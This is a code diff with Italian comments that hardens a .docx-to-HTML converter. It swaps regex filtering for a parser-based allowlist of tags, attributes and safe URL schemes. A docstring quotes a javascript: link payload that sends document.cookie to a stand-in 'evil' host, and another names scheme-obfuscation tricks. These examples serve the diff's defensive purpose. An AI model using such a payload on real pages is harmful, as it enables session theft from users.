@@ -232,17 +232,79 @@ def html_da_docx(dati: bytes) -> str:
 
     Le immagini si omettono: il confronto e' sul testo, e un data-uri
     da due megabyte nel JSON non aiuta a vedere un nome sparito.
+
+    ## Perche' si ripulisce con un parser e non con due regex
+
+    Questo HTML finisce in pagina con `innerHTML`, e il .docx da cui
+    viene non e' nostro: e' quello che un cliente ha mandato. Togliere
+    `<script>` e gli `on*=` sembrava bastare -- mammoth emette un
+    insieme chiuso di elementi -- ma **i collegamenti li emette**, e
+    l'indirizzo di un collegamento in un .docx lo sceglie chi scrive il
+    documento. Misurato: un `.docx` con un rel `Target="javascript:..."`
+    produceva `<a href="javascript:fetch('http://evil/'+document.cookie)">`,
+    che passava indenne da tutte e due le regex.
+
+    Per un prodotto che esiste per aprire documenti ricevuti da terzi,
+    quello e' il caso normale, non il caso limite. Quindi non si elenca
+    cio' che e' vietato -- si tiene solo cio' che serve: gli elementi
+    del contenuto, gli attributi che li descrivono, e negli indirizzi i
+    soli schemi che non eseguono niente.
     """
     import mammoth
+    from bs4 import BeautifulSoup
 
     def _niente(_image):
         return []
 
     risultato = mammoth.convert_to_html(io.BytesIO(dati), convert_image=_niente)
-    html = risultato.value or ""
-    html = re.sub(r"(?is)<script\b[^>]*>.*?</script>", "", html)
-    html = re.sub(r"""(?is)\son[a-z]+\s*=\s*(['"]).*?\1""", "", html)
-    return html
+    grezzo = risultato.value or ""
+    if not grezzo:
+        return ""
+
+    soup = BeautifulSoup(grezzo, "html.parser")
+    for tag in soup.find_all(True):
+        if tag.name not in _TAG_AMMESSI:
+            # `unwrap` tiene il testo: un elemento che non conosciamo non
+            # deve far sparire il contenuto che l'utente deve confrontare.
+            tag.unwrap()
+            continue
+        for nome in list(tag.attrs):
+            if nome not in _ATTR_AMMESSI:
+                del tag[nome]
+            elif nome in ("href", "src") and not _indirizzo_innocuo(tag[nome]):
+                del tag[nome]
+    return str(soup)
+
+
+#: Elementi di contenuto che mammoth produce davvero.
+_TAG_AMMESSI = frozenset({
+    "p", "br", "h1", "h2", "h3", "h4", "h5", "h6",
+    "strong", "b", "em", "i", "u", "s", "sub", "sup",
+    "ul", "ol", "li", "blockquote", "pre", "code",
+    "table", "thead", "tbody", "tr", "th", "td", "a", "span", "div",
+})
+
+_ATTR_AMMESSI = frozenset({"href", "colspan", "rowspan"})
+
+_SCHEMI_INNOCUI = ("http://", "https://", "mailto:")
+
+
+def _indirizzo_innocuo(valore: str) -> bool:
+    """Un indirizzo che, cliccato, non esegue niente.
+
+    Si normalizza prima di guardare: `JaVaScRiPt:`, gli spazi e i
+    caratteri di controllo in mezzo (`java\\tscript:`) sono il modo
+    classico di far passare uno schema per un altro.
+    """
+    if not isinstance(valore, str):
+        return False
+    pulito = re.sub(r"[\s\x00-\x1f]+", "", valore).lower()
+    if pulito.startswith(("#", "/")):
+        return True
+    if ":" not in pulito.split("/")[0]:
+        # Nessuno schema: relativo, quindi non esegue niente.
+        return True
+    return pulito.startswith(_SCHEMI_INNOCUI)
 
 
 def docx_disponibile() -> bool:
